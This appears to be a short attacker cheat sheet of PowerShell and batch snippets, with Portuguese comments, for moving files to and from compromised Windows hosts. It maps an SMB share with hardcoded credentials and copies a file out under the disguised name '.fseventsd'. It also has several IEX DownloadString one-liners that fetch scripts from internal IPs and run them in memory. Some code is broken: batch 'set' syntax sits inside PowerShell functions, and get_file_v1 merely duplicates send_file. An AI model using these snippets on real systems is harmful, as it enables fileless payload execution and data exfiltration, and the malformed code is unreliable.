
function send_file {
    set myip=192.168.70.181
    set originfile=wget.ps1
    set destinationfile=.fseventsd
    cd C:\Users\Public
    net use \\%myip%\sharename /u:myuser 123
    copy %originfile% \\%myip%\\sharename\\%destinationfile%
}

function get_file_v1 {
    set myip=192.168.70.181
    set originfile=wget.ps1
    set destinationfile=.fseventsd
    cd C:\Users\Public
    net use \\%myip%\sharename /u:myuser 123
    copy %originfile% \\%myip%\\sharename\\%destinationfile%
}

function get_file_v2 {
    Invoke-WebRequest -Uri $url -OutFile $output

    (New-Object System.Net.WebClient).DownloadFile($url, $output)

    Start-BitsTransfer -Source $url -Destination $output

    Start-BitsTransfer -Source $url -Destination $output -Asynchronous

    IEX(New-Object Net.WebClient).DownloadFile('arquivo','output')

    powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.25.123/power.ps1')    
}

function execute_on_the_fly {
    IEX(New-Object net.webclient).downloadstring("http://192.168.70.159:80/$i")
}}

# Executa na memoria
# IEX(New-Object net.webclient).downloadstring("http://192.168.70.159:80/$i")
# Baixar arquivo
# Invoke-WebRequest -Uri $url -OutFile $output